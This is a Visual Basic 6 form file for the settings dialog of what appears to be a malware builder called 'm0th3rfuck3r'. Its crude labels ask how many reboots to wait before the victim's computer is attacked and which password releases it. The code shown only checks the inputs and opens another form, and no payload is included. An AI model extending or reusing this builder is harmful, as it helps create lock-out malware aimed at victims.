VERSION 5.00
Begin VB.Form Form2 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "m0th3rfuck3r SETTINGS"
   ClientHeight    =   3900
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4965
   ControlBox      =   0   'False
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3900
   ScaleWidth      =   4965
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Quit"
      Height          =   495
      Left            =   960
      TabIndex        =   11
      Top             =   3360
      Width           =   2415
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Install with these settings"
      Height          =   495
      Left            =   960
      TabIndex        =   10
      Top             =   2760
      Width           =   2415
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   1200
      TabIndex        =   8
      Top             =   2040
      Width           =   1935
   End
   Begin VB.TextBox Text2 
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   2880
      PasswordChar    =   "*"
      TabIndex        =   6
      Top             =   1560
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   600
      PasswordChar    =   "*"
      TabIndex        =   4
      Top             =   1560
      Width           =   1695
   End
   Begin VB.ListBox List1 
      Height          =   255
      ItemData        =   "Form2.frx":0000
      Left            =   2520
      List            =   "Form2.frx":0019
      Sorted          =   -1  'True
      TabIndex        =   2
      Top             =   480
      Width           =   1335
   End
   Begin VB.Label Label6 
      Caption         =   "this name will be shown every time... the victim has been fucked!"
      Height          =   615
      Left            =   3240
      TabIndex        =   9
      Top             =   2040
      Width           =   1575
   End
   Begin VB.Label Label5 
      Caption         =   "Enter a name:"
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   2040
      Width           =   1095
   End
   Begin VB.Label Label4 
      Caption         =   "Enter same pwd"
      Height          =   255
      Left            =   2880
      TabIndex        =   5
      Top             =   1320
      Width           =   1575
   End
   Begin VB.Label Label3 
      Caption         =   "Wich password to get off with the fuck?"
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   1320
      Width           =   2535
   End
   Begin VB.Line Line3 
      X1              =   3960
      X2              =   0
      Y1              =   1200
      Y2              =   1200
   End
   Begin VB.Line Line2 
      X1              =   3960
      X2              =   3960
      Y1              =   360
      Y2              =   1200
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   3960
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Label Label2 
      Caption         =   "How many times should the computer be rebooted before m0therfucker starts to FUCK?"
      Height          =   615
      Left            =   240
      TabIndex        =   1
      Top             =   480
      Width           =   2175
   End
   Begin VB.Label Label1 
      Caption         =   "Time to make some settings!!!"
      Height          =   255
      Left            =   720
      TabIndex        =   0
      Top             =   0
      Width           =   3015
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
' mother fucker was written by §3raptor
Dim crackme As String
crackme = List1
If crackme < "" Then GoTo 100 Else GoTo 200
100 MsgBox "Sorry... no value selected in listbox!!!"
GoTo 15
200
If Text1 = Text2 Then GoTo 1 Else GoTo 2
1 GoTo 3
2 MsgBox "The passwords did'nt matched each other!", vbExclamation, "ERROR!"
GoTo 15
3 If Text3 > "" Then GoTo 4 Else GoTo 5
4 Me.Hide
Form3.Show
GoTo 15
5 MsgBox "No name entered..."
15 End Sub
